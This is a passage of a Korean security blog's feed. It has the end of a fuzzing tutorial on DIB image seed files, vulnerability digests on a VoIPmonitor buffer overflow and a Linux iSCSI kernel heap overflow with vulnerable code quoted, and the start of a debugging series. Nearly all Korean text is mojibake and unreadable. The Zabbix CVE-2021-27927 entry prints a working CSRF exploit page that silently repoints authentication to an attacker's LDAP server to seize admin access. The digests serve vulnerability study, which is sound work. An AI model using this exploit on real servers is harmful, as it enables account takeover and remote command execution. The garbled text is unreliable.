•ë³´ë“¤ì´ ì–´ë– í•œ ê°€ê³µë„ ë˜ì§€ ì•Šê³  ë°”ë¡œ ì €ì¥ë˜ì–´ ìˆì£ . (ì••ì¶•í•˜ëŠ” ê²ƒë„ ìˆê¸°ëŠ” í•´ìš” í•˜ì§€ë§Œ ê·¸ëƒ¥ ë„˜ì–´ê°ˆê²Œì—¬) </p><p>í¬ë§·ì€ ë‘ ê°œì˜ êµ¬ì¡°ì²´ì™€ ë¹„íŠ¸ë§µ ì •ë³´ë¡œ ì´ë£¨ì–´ì ¸ ìˆìŠµë‹ˆë‹¤. ì¼ë‹¨ íŒŒì¼ì„ ë§Œë“¤ì–´ë³¼ê²Œìš”. ê°œê¿€ì¸ ê²Œ ìœˆë„ìš°ì— ê¸°ë³¸ìœ¼ë¡œ ìˆëŠ” ê·¸ë¦¼íŒì„ ì‚¬ìš©í•´ì„œ dib íŒŒì¼ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image3.png"></p><p>ì—¬ê¸°ì—ì„œëŠ” 24 ë¹„íŠ¸ ë¹„íŠ¸ë§µì˜ dib í¬ë§·ì„ ì‚¬ìš©í•  ê²ë‹ˆë‹¤. 24 ë¹„íŠ¸ì¸ ì´ìœ ëŠ” RGBë¥¼ í‘œí˜„í•˜ê¸° ìœ„í•´ì„œ í•œ í”½ì…€ì„ í‘œí˜„í•˜ëŠ” ë° 3 ë°”ì´íŠ¸ë¥¼ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.</p><p>ì´ë ‡ê²Œ ë¨¼ì € ì €ì¥ì„ í•˜ê³  ì•„ë¬´ ìƒ‰ì´ë‚˜ ë„£ì–´ë³¼ê²Œìš”. ê·¸ëŸ° ë‹¤ìŒ ì €ì¥í•˜ê³  hxdë¡œ ë´…ë‹ˆë‹¤. ì €ëŠ” ê·¸ëƒ¥ íšŒìƒ‰ìœ¼ë¡œ ì¹ í•´ë³´ì•˜ëŠ” ë° í—¥ìŠ¤ë¡œ ë³´ë‹ˆê¹Œ ì•„ë˜ì²˜ëŸ¼ ë‚˜ì˜¤ë„¤ìš”.</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image4.jpg"></p><p>ìŒ ë”± ë´ë„ ìœ„ì— ë¹¨ê°„ ë¶€ë¶„ì´ í—¤ë” ì •ë³´ì´ê³  ë’¤ì—ì„œ ë¹„íŠ¸ë§µ ì •ë³´ì¸ ê±° ê°™ì£ ?? ì´ë ‡ê²Œ<br>ê°„ë‹¨í•œ í¬ë§· ì²˜ìŒ ë³´ëŠ” ê±° ê°™ì£ ?? ã…‡ã…ˆ? ã…‡ã…‡ã…ˆ</p><p>ê·¸ëŸ¼ ì´ì œ ë¹¨ê°„ìƒ‰ ë°•ìŠ¤ ë¶€ë¶„ì˜ ì •ë³´ê°€ ë­”ì§€ ê°„ë‹¨í•˜ê²Œë§Œ ì•Œì•„ë³¼ê²Œìš”. ì°¸ê³ ë¡œ ë‹¤ë¥¸ í¬ë§·ìœ¼ë¡œ ì§„í–‰í•  ë•Œì—ë„ í¬ë§·ì„ ì•Œê³  ë¦¬ë²„ì‹±ì„ ì§„í–‰í•˜ëŠ” ê²Œ ì¢€ ë” í¸í•©ë‹ˆë‹¤. íŠ¹íˆ ë¦¬ë²„ì‹±ì„ ì§„í–‰í•  ë•Œì—ëŠ” í•´ë‹¹ ë¶€ë¶„ì´ ì–´ë–¤ ì—­í• ì„ í•˜ëŠ” ì§€ ê·¸ë˜ì„œ ìš°ë¦¬ê°€ ìµìŠ¤í”Œë¡œì‡ì— ì–´ë–»ê²Œ í™œìš©ì„ í•  ìˆ˜ ìˆëŠ”ì§€ ì•Œ ìˆ˜ ìˆì£ . í™•ì‹¤íˆ ë¦¬ë²„ì‹± ì†ë„ë¥¼ í–¥ìƒì‹œì¼œ ì£¼ê¸°ëŠ” í•©ë‹ˆë‹¤.</p><p>ì¼ë‹¨ ì²« ë²ˆì§¸ êµ¬ì¡°ì²´ë¥¼ ë³´ë©´</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image5.png"></p><p>ì´ë ‡ê²Œ ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><p>ì²« ë²ˆì§¸ëŠ” ë‹¹ì—°íˆ í—¤ë”ê°€ ë“¤ì–´ê°€ ìˆê³  ë’¤ì— íŒŒì¼ì˜ ì „ì²´ ì‚¬ì´ì¦ˆ ê·¸ë¦¬ê³  ë§ˆì§€ë§‰ì€ ë¹„íŠ¸ë§µ ì •ë³´ê°€ ì‹œì‘ë˜ëŠ” ì˜¤í”„ì…‹ì„ ì €ì¥í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><p>ê·¸ë¦¬ê³  ë‘ ë²ˆì§¸ ì˜¤í”„ì…‹ì„ ë³¼ê²Œì—¬</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image6.png"></p><p>ì´ë¯¸ì§€ì˜ ê°€ë¡œ ì„¸ë¡œ ê¸¸ì´, í•´ìƒë„, ì••ì¶• ì—¬ë¶€ ë“±ë“±ì´ ì €ì¥ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ êµ¬ì¡°ì²´ëŠ” ì¢€ ë” ë§ë„¤ìš”? ìœ„ êµ¬ì¡°ì²´ëŠ” ì €ì¥í•˜ëŠ” ë°ë§Œ ì“°ì´ê³  ì‹¤ì œ ì¶œë ¥í•  ë•Œì—ëŠ” ì•„ë˜ êµ¬ì¡°ì²´ì˜ ì •ë³´ë¥¼ ì‚¬ìš©í•œë‹¤ê³  í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ ë”±íˆ ìµìŠ¤ì—ëŠ” ë„ì›€ì´ ì•ˆ ë˜ë‹ˆ ê·¸ëƒ¥ ì´ì •ë„ë§Œ ì•Œê³  í•„ìš”í•œ ê±°ëŠ” ë’¤ì—ì„œ ì§„í–‰í•˜ë©´ì„œ ì•Œì•„ë³´ë„ë¡ í• ê²Œìš”. ë” ì•Œê³  ì‹¶ì€ ë¶„ì€ ì•„ë˜ ë§í¬ë¥¼ ì°¸ê³ í•˜ì‹œë©´ ë  ê±° ê°™ìŠµë‹ˆë‹¤.</p><p><a href="http://www.soulfree.net/186">http://www.soulfree.net/186</a></p><p>ì´ì œ í—¤ë” ì •ë³´ë“¤ë„ ì•Œì•˜ê³  í¼ì €ì— ëŒë ¤ë³¼ ê±´ë° í¼ì €ë¥¼ ëŒë¦¬ê¸° ì „ì— ë¶„ì„ì„ ì¢€ ë” í¸í•˜ê²Œ í•˜ê¸° ìœ„í•´ì„œ ì €ë§Œì˜ ë°ì´í„°ë¥¼ ë„£ì„ ê²ë‹ˆë‹¤.</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image7.jpg"></p><p>ë¹„íŠ¸ë§µ ì •ë³´ê°€ ë“¤ì–´ìˆëŠ” ë¶€ë¶„ì˜ ì•ë¶€ë¶„ì„ ì œ ë‹‰ë„¤ì„ìœ¼ë¡œ ë°”ê¾¸ì—ˆëŠ”ë°ìš”. ì´ë ‡ê²Œ í•˜ë©´ ë‚˜ì¤‘ì— í¬ë˜ì‹œ ë¶„ì„ì„ í•  ë•Œ ë‚´ íŒŒì¼ì´ ì–´ë””ì— ë¡œë“œë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ê¸° í¸í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ë‹¤ë¥¸ ë©”ëª¨ë¦¬ì—ëŠ” ì—†ì„ ë²•í•œ ë¬¸ìì—´ë¡œ ì±„ì›Œì£¼ëŠ” ê²Œ ì¢‹ì£ . AAAA ë‚˜ BBBB ì´ëŸ° ê±°ëŠ” ë‹¨ìˆœí•´ì„œ ë‹¤ë¥¸ ì“°ë ˆê¸° ë°ì´í„°ì—ë„ ì¡´ì¬í•˜ê¸° ë•Œë¬¸ì— ì €ëŠ” ì œ ë‹‰ë„¤ì„ì„ ì£¼ë¡œ ì‚¬ìš©í•˜ëŠ” í¸ì…ë‹ˆë‹¤. ì¶”ê°€ì ìœ¼ë¡œ íŒŒì¼ ë§¨ ë’¤ì—ë„ ë¹„ìŠ·í•˜ê²Œ ë„£ì–´ì£¼ë©´ ëê¹Œì§€ ë‹¤ ë¡œë“œë˜ì—ˆëŠ” ì§€ë„ ì•Œ ìˆ˜ ìˆê² ì£ ? ì´ë ‡ê²Œ ì‹œë“œ íŒŒì¼ì„ ë§Œë“¤ê³  í¼ì €ë¥¼ ëŒë¦¬ë©´ ë©ë‹ˆë‹¤. </p><p>ë‘ íŒŒíŠ¸ì— ê±°ì³ ì›Œë°ì—…ì´ ë§ˆë¬´ë¦¬ ëë„¤ìš”..! ë„¤ ì´ì œ ì‹œì‘ì´ë¼ëŠ” ëœ»ì…ë‹ˆë‹¤ ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹</p><p>ë‹¤ìŒ ê¸€ì—ì„œëŠ” ë³¸ê²©ì ìœ¼ë¡œ í¼ì €ì˜ í¬ë˜ì‹œ ì •ë³´ë¥¼ í†µí•´ ì·¨ì•½ì ì„ ë¶„ì„í•˜ê³  ìµìŠ¤í”Œë¡œì‡ì„ í•´ë³¼ ê±´ë°ìš”. ë³¸ê²©ì ì¸ ì‚½ì§ˆì— ì£¼ì˜í•´ì£¼ì‹œê¸° ë°”ëë‹ˆë‹¤ ã…ã… ê·¸ëŸ¼ Part 3ë¡œ ëŒì•„ì˜¤ê² ìŠµë‹ˆë‹¤!</p><h2 id="Part-3-ì˜ˆê³ "><a href="#Part-3-ì˜ˆê³ " class="headerlink" title="Part 3 ì˜ˆê³ "></a>Part 3 ì˜ˆê³ </h2><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image8.png"></p><blockquote><p>ê³ ìƒì€ ì´ì œë¶€í„° ì‹œì‘..</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>bug hunting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„]VoIPmonitor BoF to RCE</title>
    <link href="/2021/03/17/fabu1ous/2021-03-17/"/>
    <url>/2021/03/17/fabu1ous/2021-03-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://github.com/EnableSecurity/advisories/tree/master/ES2021-03-voipmonitor-livesniffer-buffer-overflow">VoIPmonitor is vulnerable to a buffer overflow when using the live sniffer</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>VoIPmonitor 27.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>ì˜¤í”ˆì†ŒìŠ¤ network packet snifferì¸ VoIPmonitorì—ì„œ RCEì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. </p><pre><code class="hljs c"><span class="hljs-keyword">char</span> callidstr[<span class="hljs-number">1024</span>] = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">if</span>(packetS-&gt;sipDataLen) &#123;    <span class="hljs-keyword">void</span> *memptr = memmem(packetS-&gt;data_()+ packetS-&gt;sipDataOffset,         packetS-&gt;sipDataLen, <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-number">2</span>);    <span class="hljs-keyword">if</span>(memptr) &#123;        <span class="hljs-built_in">memcpy</span>(description, packetS-&gt;data_()+ packetS-&gt;sipDataOffset,             (<span class="hljs-keyword">char</span> *)memptr - (<span class="hljs-keyword">char</span>*)(packetS-&gt;data_()+ packetS-&gt;sipDataOffset));        description[(<span class="hljs-keyword">char</span>*)memptr - (<span class="hljs-keyword">char</span>*)(packetS-&gt;data_()+             packetS-&gt;sipDataOffset)] = <span class="hljs-string">&#x27;\0&#x27;</span>;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, description);    &#125;    <span class="hljs-comment">// ...</span>&#125;</code></pre><p>ìœ„ëŠ” í•¨ìˆ˜ <code>save_packet_sqp</code>ì˜ ì½”ë“œì…ë‹ˆë‹¤. ë³€ìˆ˜ <code>description</code>ì€ 1024 bytes í¬ê¸°ë¡œ ê³ ì •ë˜ì–´ ìˆëŠ” SIP request ê°’ì„ ì €ì¥í•˜ëŠ” ë°°ì—´ì…ë‹ˆë‹¤. <code>description</code>ì˜ í¬ê¸°ë³´ë‹¤ í° requestë¥¼ ë³´ë‚´ ë²„í¼ì˜¤ë²„í”Œë¡œìš°ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. Stack canary, RELRO ë“± í‘œì¤€ memory corruption ë³´í˜¸ ê¸°ë²•ì´ ì—†ìœ¼ë¯€ë¡œ ë²„í¼ì˜¤ë²„í”Œë¡œìš°ë¥¼ í†µí•œ ì›ê²©ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>bof</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-27365: Linux ì»¤ë„ì—ì„œ ë°œê²¬ëœ 15ë…„ê°„ ì¡´ì¬í•œ ê¶Œí•œìƒìŠ¹ ì·¨ì•½ì </title>
    <link href="/2021/03/16/l0ch/2021-03-16/"/>
    <url>/2021/03/16/l0ch/2021-03-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://movaxbx.ru/2021/03/13/new-old-bugs-in-the-linux-kernel/?utm_source=rss&utm_medium=rss&utm_campaign=new-old-bugs-in-the-linux-kernel">New Old Bugs in the Linux Kernel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Linux ë°°í¬íŒ(RHEL 8.1, 8.2 ë° 8.3ì—ì„œ í…ŒìŠ¤íŠ¸ë¨)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Linux ì»¤ë„ì˜ í•˜ìœ„ ì‹œìŠ¤í…œì¸ <a href="https://ko.wikipedia.org/wiki/SCSI">SCSI (Small Computer System Interface)</a>ì´ í¬í•¨ëœ ë°°í¬íŒì—ì„œ heap buffer overflowì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ 15ë…„ê°„ ì¡´ì¬í–ˆë˜ ê²ƒìœ¼ë¡œ ì•Œë ¤ì¡ŒìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì€ <code>iscsi_session_get_param</code> í•¨ìˆ˜ì— ì¡´ì¬í•©ë‹ˆë‹¤. ìœ ì €ëŠ” í˜¸ìŠ¤íŠ¸ ì´ë¦„, ìœ ì € ì´ë¦„ê³¼ ê°™ì€ iSCSI ì—°ê²°ê³¼ ê´€ë ¨ëœ ì†ì„±ì„ ì„¤ì •í•˜ëŠ” iSCSI í•˜ìœ„ ì‹œìŠ¤í…œì— netlink ë©”ì‹œì§€ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. netlink ë©”ì‹œì§€ì˜ ìµœëŒ€ ê¸¸ì´ëŠ” ì‹œìŠ¤í…œì— ë”°ë¼ <code>2^32</code> ë˜ëŠ” <code>2^16</code> í¬ê¸°ì…ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-keyword">switch</span>(param) &#123;...<span class="hljs-keyword">case</span> ISCSI_PARAM_USERNAME:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;username);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> ISCSI_PARAM_USERNAME_IN:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;username_in);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> ISCSI_PARAM_PASSWORD:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;password);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> ISCSI_PARAM_PASSWORD_IN:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;password_in);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> ISCSI_PARAM_IFACE_NAME:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;ifacename);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> ISCSI_PARAM_INITIATOR_NAME:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;initiatorname);<span class="hljs-keyword">break</span>;...</code></pre><p>ë©”ì‹œì§€ì˜ ê° ì†ì„±ì€ <code>sprintf</code> í•¨ìˆ˜ë¡œ ì²˜ë¦¬ë˜ê³  í• ë‹¹ë˜ëŠ” ë²„í¼ í¬ê¸°ëŠ” ì»¤ë„ì˜ <code>PAGE_SIZE</code>ë¡œ ì„¤ì •ë˜ë©° í¬ê¸°ì— ëŒ€í•œ ê²€ì‚¬ê°€ ì—†ìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì†ì„±ì„ <code>PAGE_SIZE</code>ë³´ë‹¤ ë§ì´ ì…ë ¥í•˜ë©´ buffer overflowë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í˜„ì¬ê¹Œì§€ í™•ì¸ëœ ì·¨ì•½í•œ ë°°í¬íŒì€ <code>libiscsi</code> ì»¤ë„ ëª¨ë“ˆì„ ìë™ ë¡œë“œí•˜ëŠ” CentOS ë° RHEL ë²„ì „ 8.1, 8.2, 8.3ì´ë©° ë‹¤ë¥¸ ë°°í¬íŒ ë˜í•œ í•´ë‹¹ ëª¨ë“ˆì´ ë¡œë“œë˜ì–´ ìˆìœ¼ë©´ ê³µê²© ì¡°ê±´ì„ ë§Œì¡±í•©ë‹ˆë‹¤. ê·¸ ì™¸ CVE-2021-27363(ì»¤ë„ í¬ì¸í„° ìœ ì¶œ ì·¨ì•½ì ), CVE-2021-27364(ì»¤ë„ OOB read ì·¨ì•½ì ) ë˜í•œ ë™ì¼í•œ SCSI ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì˜ íŒ¨ì¹˜ íˆìŠ¤í† ë¦¬ëŠ” <a href="https://github.com/torvalds/linux/commit/ec98ea7070e94cc25a422ec97d1421e28d97b7ee#diff-156a34b787dc5569ae3b78903bbda80af9e2264786c6cb8efb16c7ee32bd4bca">torvalds/linux</a> ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>heap bof</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>heap buffer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-27927: Zabbixì—ì„œ ë°œê²¬ëœ CSRFë¥¼ í†µí•œ RCE</title>
    <link href="/2021/03/15/idioth/2021-03-15/"/>
    <url>/2021/03/15/idioth/2021-03-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://movaxbx.ru/2021/03/12/cve-2021-27927-csrf-to-rce-chain-in-zabbix/?utm_source=rss&utm_medium=rss&utm_campaign=cve-2021-27927-csrf-to-rce-chain-in-zabbix">CVE-2021-27927: CSRF to RCE Chain in Zabbix</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Zabbix version &lt; 4.0.28rc1, 5.0.8rc1, 5.2.4rc1, 5.4.0alpha1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ê¸°ì—…ìš© IT ë„¤íŠ¸ì›Œí¬, ì• í”Œë¦¬ì¼€ì´ì…˜ ëª¨ë‹ˆí„°ë§ ì†”ë£¨ì…˜ Zabbixì—ì„œ CSRF ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ì·¨ì•½ì ì€ Zabbix UIì˜ ì¸ì¦ ë¶€ë¶„ì— ì¡´ì¬í•˜ë©°, CSRFë¥¼ í†µí•´ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìê°€ Zabbix ê´€ë¦¬ìê°€ ì•…ì„± ë§í¬ë¥¼ ì ‘ì†í•˜ë„ë¡ ìœ ë„í•˜ì—¬ ê´€ë¦¬ì ê¶Œí•œì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½ì ì€ <a href="https://www.hahwul.com/2020/01/18/samesite-lax/"><code>SameSite=Lax</code> ì¿ í‚¤ ë³´í˜¸</a>ê°€ ì ìš©ëœ ê²½ìš°ì—ë„ ëª¨ë“  ë¸Œë¼ìš°ì €ì—ì„œ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ZabbixëŠ” request bodyì˜ <code>sid</code> íŒŒë¼ë¯¸í„°ì— anti-CSRF í† í°ì„ ì‚¬ìš©í•˜ì—¬ CSRF ê³µê²©ì„ ë°©ì§€í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì¸ì¦ ì„¤ì • ì—…ë°ì´íŠ¸ ë¶€ë¶„ì—ì„œ anti-CSRF í† í°ì„ ì‚¬ìš©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë˜í•œ ZabbixëŠ” POST requestì˜ ëª¨ë“  íŒŒë¼ë¯¸í„°ë¥¼ GETì„ í†µí•´ URL ì¿¼ë¦¬ íŒŒë¼ë¯¸í„°ë¡œ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì¸ì¦ ì„¤ì • ì—…ë°ì´íŠ¸ ë¶€ë¶„ì—ì„œ GET requestë¥¼ ì „ì†¡í•˜ë©´, <code>sid</code> íŒŒë¼ë¯¸í„°ê°€ ì—†ì–´ë„ ì²˜ë¦¬ë©ë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•˜ëŠ” ìˆœì„œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><p>íƒ€ê¹ƒ Zabbix ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” LDAP ì„œë²„ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤.</p></li><li><p>ì•…ì„± HTML í˜ì´ì§€ë¥¼ ì‚½ì…í•œ ì›¹ ì‚¬ì´íŠ¸ë¥¼ í˜¸ìŠ¤íŒ… í•©ë‹ˆë‹¤. ì•„ë˜ëŠ” exploit ì½”ë“œì˜ ì˜ˆì œì…ë‹ˆë‹¤.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Any web site<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;link&#x27;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;http://192.168.0.140/zabbix.php?form_refresh=1&amp;action=authentication.update&amp;db_authentication_type=0&amp;authentication_type=1&amp;http_auth_enabled=0&amp;ldap_configured=1&amp;ldap_host=10.0.229.1&amp;ldap_port=389&amp;ldap_base_dn=dc%3Dsmoke%2Cdc%3Dnet&amp;ldap_search_attribute=sAMAccountName&amp;ldap_bind_dn=cn%3DAdmin%2CCN%3DUsers%2CDC%3Dsmoke%2CDC%3Dnet&amp;ldap_case_sensitive=1&amp;action_passw_change=authentication.edit&amp;ldap_test_user=Admin&amp;ldap_test_password=Z@bb1x!&amp;saml_auth_enabled=0&amp;update=Update&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;link&#x27;</span>).click();</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></li><li><p>Zabbix ê´€ë¦¬ìê°€ í•´ë‹¹ ë§í¬ì— ì ‘ì†í•˜ë©´, ì¸ì¦ ì„¤ì •ì´ ìë™ìœ¼ë¡œ ì—…ë°ì´íŠ¸ë©ë‹ˆë‹¤.</p></li><li><p>í•´ì»¤ì˜ ìê²© ì¦ëª…ì„ í†µí•´ ê´€ë¦¬ìë¡œ ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p></li></ol><p>í•´ì»¤ëŠ” Zabbixì—ì„œ ì¸ì¦ ì„¤ì •ì´ ì—…ë°ì´íŠ¸ë˜ë©´ ìê²© ì¦ëª…ì˜ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ í†µí•´ LDAP ì„œë²„ì—ì„œ CSRF ê³µê²©ì´ ì„±ê³µí–ˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ ê´€ë¦¬ìë¡œ ì ‘ê·¼í•  ì‹œ Zabbixì— ë‚´ì¥ëœ ê¸°ëŠ¥ì„ í†µí•´ Zabbix ì„œë²„, Zabbix ì„œë²„ í”„ë¡ì‹œ, Zabbix agentì—ì„œ command executionì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>csrf</tag>
      
      <tag>zabbix</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] ì‹œê°„ì„ ì—¬í–‰í•˜ëŠ” í•´ì»¤ë¥¼ ìœ„í•œ ì•ˆë‚´ì„œ Part3</title>
    <link href="/2021/03/14/fabu1ous/ttd-3/"/>
    <url>/2021/03/14/fabu1ous/ttd-3/</url>
    
    <content type="html"><![CDATA[<h1 id="Part-III"><a href="#Part-III" class="headerlink" title="Part III"></a>Part III</h1><p><img src="/2021/03/14/fabu1ous/ttd-3/1.png"></p><p>ë²Œì¨ Part 3ì…ë‹ˆë‹¤. 3ì£¼ë§ˆë‹¤ ì‹œë¦¬ì¦ˆ ê¸€ í•˜ë‚˜ì”© ë¸”ë¡œê·¸ì— ì˜¬ë¦¬ê³  ìˆëŠ”ë° 3ì£¼ê°€ ì™œ ì´ë ‡ê²Œ ë¹¨ë¦¬ ì§€ë‚˜ê°ˆê¹Œìš”. ì•„ë§ˆ ê°œê°•ë„ í•˜ê³  ë°”ë¹ ì§€ë‹ˆ ì‹œê°„ì´ ì°¸ ë¹ ë¥´ê²Œ í˜ëŸ¬ê°€ëŠ” ê²ƒì²˜ëŸ¼ ëŠê»´ì§€ë‚˜ ë´…ë‹ˆë‹¤. ì´ë²ˆ Part 3ì—ì„œëŠ” <code>dx</code> ëª…ë ¹ì–´ì™€ TTD data objectì˜ ì‚¬ìš©ë²•ì„ ì •ë¦¬í•´ë´¤ìŠµë‹ˆë‹¤. Part 2ë¥¼ ì½ìœ¼ì‹  ë¶„ë“¤ì´ë¼ë©´ ì´ê²Œ ë¬´ì—‡ì„ ëœ»í•˜ëŠ”ì§€ ì•„ì‹œê² ì£ ? ë„¤, ì´ë²ˆì—ë„ ë²„ê·¸ ë°”ìš´í‹°ë¥¼ <s>ì•ˆ í–ˆìŠµë‹ˆë‹¤</s> ëª»í–ˆìŠµë‹ˆë‹¤. Apex Legends ê¿€ì¼ ã…ã…;; ì‚¬ì‹¤ ë²„ê·¸ ë°”ìš´í‹°ë¥¼ í•˜ê¸´ í–ˆëŠ”ë° ë§‰ìƒ â€œTTDë¥¼ ì‚¬ìš©í•œ ë²„ê·¸ ë°”ìš´í‹° ê¿€íŒ!â€ì´ë¼ëŠ” ì£¼ì œë¡œ í•˜ë‚˜ì˜ ê¸€ì„ ì“°ê¸°ì—” ì—„ì²­ ì• ë§¤í•˜ë”ë¼ê³ ìš”. ì´ë¯¸ ì´ì „ íŒŒíŠ¸ë“¤ì—ì„œ ì‘ì„±í•œ ë‚´ìš©ë“¤ì´ ëŒ€ë¶€ë¶„ì´ê³  ëª‡ëª‡ ìƒí™©ë“¤ì€ ê¸€ë¡œ í˜•ìš©í•˜ê¸°ì—” ì €ì˜ 